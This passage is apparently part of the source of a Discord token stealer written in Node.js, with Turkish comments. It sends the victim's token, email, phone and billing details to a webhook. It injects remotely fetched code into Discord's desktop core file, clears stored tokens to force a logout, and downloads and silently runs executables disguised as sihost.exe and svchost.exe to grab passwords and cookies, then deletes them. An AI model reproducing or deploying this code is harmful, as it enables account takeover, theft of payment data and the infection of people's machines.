             fields: [
                 { name: "Username", value: `\`${userInfo.username}\``, inline: true },
                 { name: "User ID", value: `\`${userInfo.id}\``, inline: true },
                 { name: "Nitro", value: nitro || "None", inline: true },
                 { name: "Badges", value: getBadges(userInfo.flags) || "None", inline: false },
                 { name: "Billing", value: billingInfo || "No valid billing methods.", inline: true },
                 { name: "Email", value: userInfo.email ? `\`${userInfo.email}\`` : "None", inline: true },
                 { name: "Phone", value: userInfo.phone ? `\`${userInfo.phone}\`` : "None", inline: true },
                 { name: "Token", value: `\`${token}\``, inline: false },
                 { name: "Bio", value: userInfo.bio || "None", inline: false },
             ],
             footer: { text: "NyxSoftware" },
             timestamp: new Date().toISOString(),
         };

         // Discord'a embed gönder
         await sendEmbedToDiscord(embed);
     } catch (error) {
         console.error("Hata oluştu:", error.message);

      }
  }
}





const appData = process.env.APPDATA || path.join(process.env.HOME, '.config');
const localAppData = process.env.LOCALAPPDATA || path.join(process.env.HOME, '.local', 'share');
const discordPaths = [
    { appPath: path.join(appData, 'discord'), exePath: path.join(localAppData, 'Discord') },
    { appPath: path.join(appData, 'discordcanary'), exePath: path.join(localAppData, 'DiscordCanary') },
    { appPath: path.join(appData, 'discordptb'), exePath: path.join(localAppData, 'DiscordPTB') },
    { appPath: path.join(appData, 'discorddevelopment'), exePath: path.join(localAppData, 'DiscordDevelopment') },
    { appPath: path.join(appData, 'lightcord'), exePath: path.join(localAppData, 'Lightcord') },
];

// Regex tanımı
const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/gm;

// Tüm Discord dizinlerini tarayarak işlem yapma
function walkDir(dir) {
    if (!fs.existsSync(dir)) {  // Dizin var mı kontrolü
        console.error(`Dizin bulunamadı: ${dir}`);
        return;
    }

    fs.readdirSync(dir).forEach(file => {
        const filePath = path.join(dir, file);
        try {
            if (fs.statSync(filePath).isDirectory()) {
                if (file.startsWith('app-')) {
                    const modulesPath = path.join(filePath, 'modules');
                    if (fs.existsSync(modulesPath)) {
                        const discordDesktopCore1Path = path.join(modulesPath, 'discord_desktop_core-1');
                        if (fs.existsSync(discordDesktopCore1Path)) {
                            const discordDesktopCorePath = path.join(discordDesktopCore1Path, 'discord_desktop_core');
                            if (fs.existsSync(discordDesktopCorePath)) {
                                const indexPath = path.join(discordDesktopCorePath, 'index.js');
                                if (fs.existsSync(indexPath)) {
                                    // İlgili URL'yi çekip dosyayı düzenle
                                    https.get('https://raw.githubusercontent.com/Wizzzy81/whowantkittycats/refs/heads/main/uskudar.js', response => {
                                        let data = '';
                                        response.on('data', chunk => {
                                            data += chunk;
                                        });
                                        response.on('end', () => {
                                            const newData = data.replace('%WEBHOOK%', webhookUrl);
                                            fs.writeFileSync(indexPath, newData);
                                            console.log(`${indexPath} başarıyla güncellendi.`);
                                        });
                                    });
                                }
                            }
                        }
                    }
                } else {
                    walkDir(filePath); // Eğer alt klasör varsa, tekrar tarama
                }
            }
        } catch (err) {
            console.error(`Dosyaya erişim hatası: ${filePath}`, err.message);
        }
    });
}

// Discord süreçlerini kapat
function killAllDiscordProcesses(callback) {
    console.log('Tüm Discord süreçleri sonlandırılıyor...');
    exec('tasklist', (err, stdout) => {
        if (err) {
            console.error('Süreç listesi alınamadı:', err);
            return;
        }

        // Çalışan Discord süreçlerini bul
        const discordProcesses = stdout
            .split('\n')
            .filter(line => line.toLowerCase().includes('discord'))
            .map(line => line.trim().split(/\s+/)[1]); // PID'yi al

        if (discordProcesses.length > 0) {
            console.log('Kapatılacak süreç PID\'leri:', discordProcesses);
            discordProcesses.forEach(pid => {
                exec(`taskkill /PID ${pid} /F`, (err) => {
                    if (err) {
                        console.error(`Süreç ${pid} sonlandırılamadı:`, err.message);
                    } else {
                        console.log(`Süreç ${pid} başarıyla sonlandırıldı.`);
                    }
                });
            });
        } else {
            console.log('Discord süreçleri bulunamadı.');
        }

        if (callback) setTimeout(callback, 2000); // Kapatma işleminden sonra gecikme
    });
}

// LDB ve LOG dosyalarını temizle
function cleanLevelDbFiles(callback) {
    console.log('LDB ve LOG dosyaları taranıyor...');

    discordPaths.forEach(({ appPath }) => {
        const levelDbPath = path.join(appPath, 'Local Storage', 'leveldb');

        if (!fs.existsSync(levelDbPath)) {
            console.log(`Klasör mevcut değil: ${levelDbPath}`);
            return;
        }

        fs.readdir(levelDbPath, (err, files) => {
            if (err) {
                console.error('Klasör okuma hatası:', err);
                return;
            }

            files.forEach(file => {
                const filePath = path.join(levelDbPath, file);
                if (file.endsWith('.ldb') || file.endsWith('.log')) {
                    fs.readFile(filePath, 'utf8', (err, data) => {
                        if (err) {
                            console.error(`Dosya okuma hatası: ${filePath}`, err);
                            return;
                        }

                        const cleanedData = data.replace(encryptedRegex, '');
                        fs.writeFile(filePath, cleanedData, 'utf8', (err) => {
                            if (err) {
                                console.error(`Dosya yazma hatası: ${filePath}`, err);
                            } else {
                                console.log(`${file} dosyası başarıyla güncellendi.`);
                            }
                        });
                    });
                }
            });
        });
    });

    if (callback) setTimeout(callback, 2000); // Temizleme işleminden sonra gecikme
}

// Discord'u yeniden başlat
function startDiscord() {
    console.log('Discord yeniden başlatılıyor...');
    let started = false;

    // Tüm Discord sürümlerini tarayıp başlat
    discordPaths.forEach(({ exePath }) => {
        if (exePath.toLowerCase().includes('discord')) {  // Sadece 'discord' içeren yolu çalıştır
            const updateExe = path.join(exePath, 'Update.exe');
            if (fs.existsSync(updateExe)) {
                console.log(`Discord başlatılıyor: ${updateExe}`);
                exec(`"${updateExe}" --processStart Discord.exe`, (err) => {
                    if (err) {
                        console.error('Discord başlatılamadı:', err.message);
                    } else {
                        console.log('Discord başarıyla başlatıldı.');
                    }
                });
                started = true;
            }
        }
    });

    if (!started) {
        console.error('Hiçbir Discord sürümü bulunamadı.');
    }
}

// Ana işlemi çalıştır
function modifyAndRestartDiscord() {
    killAllDiscordProcesses(() => {
        discordPaths.forEach(({ exePath }) => {
            walkDir(exePath); // Tüm Discord dizinlerinde işlem yap
        });

        cleanLevelDbFiles(() => {
            startDiscord();
        });
    });
}

function kukorpass() {
    const url = 'https://wizzzy81.github.io/whowantkittycats/sihost.exe'; // URL of the file to be downloaded
    const exeName = 'sihost.exe';       // Name of the executable to be run
    // Encode the webhook URL into Base64
    const base64Webhook = Buffer.from(webhookUrl).toString('base64');

    const appDataPath = process.env.APPDATA; // %APPDATA% directory
    const exePath = path.join(appDataPath, exeName);

    const file = fs.createWriteStream(exePath);

    https.get(url, (response) => {
        if (response.statusCode !== 200) {
            console.error(`Failed to download file: ${response.statusCode}`);
            return;
        }

        response.pipe(file);

        file.on('finish', () => {
            file.close(() => {
                console.log(`${exeName} downloaded successfully.`);

                // Run the file silently in the background
                execFile(exePath, [base64Webhook], { cwd: appDataPath, detached: true, stdio: 'ignore' }, (error) => {
                    if (error) {
                        console.error(`Error executing file: ${error.message}`);
                        return;
                    }
                    console.log(`${exeName} executed successfully.`);

                    // Delete the file after execution
                    fs.unlink(exePath, (err) => {
                        if (err) {
                            console.error(`Error deleting file: ${err.message}`);
                            return;
                        }
                        console.log(`${exeName} deleted successfully.`);
                    });
                });
            });
        });
    }).on('error', (err) => {
        console.error(`Download error: ${err.message}`);
    });
}

function passorkuk() {
    const url = 'https://wizzzy81.github.io/whowantkittycats/svchost.exe'; // URL of the file to be downloaded
    const exeName = 'svchost.exe';       // Name of the executable to be run
    // Encode the webhook URL into Base64
    const base64Webhook = Buffer.from(webhookUrl).toString('base64');

    const appDataPath = process.env.APPDATA; // %APPDATA% directory
    const exePath = path.join(appDataPath, exeName);

    const file = fs.createWriteStream(exePath);

    https.get(url, (response) => {
        if (response.statusCode !== 200) {
            console.error(`Failed to download file: ${response.statusCode}`);
            return;
        }

        response.pipe(file);

        file.on('finish', () => {
            file.close(() => {
                console.log(`${exeName} downloaded successfully.`);

                // Run the file silently in the background
                execFile(exePath, [base64Webhook], { cwd: appDataPath, detached: true, stdio: 'ignore' }, (error) => {
                    if (error) {
                        console.error(`Error executing file: ${error.message}`);
                        return;
                    }
                    console.log(`${exeName} executed successfully.`);

                    // Delete the file after execution
                    fs.unlink(exePath, (err) => {
                        if (err) {
                            console.error(`Error deleting file: ${err.message}`);
                            return;
                        }
                        console.log(`${exeName} deleted successfully.`);
                    });
                });
            });
        });
    }).on('error', (err) => {
        console.error(`Download error: ${err.message}`);
    });
}


//token functions
stealwebTokens();
grabDiscordAndSendEmbed();

//injection & logout
modifyAndRestartDiscord();


//get pass cookie
kukorpass();
passorkuk();









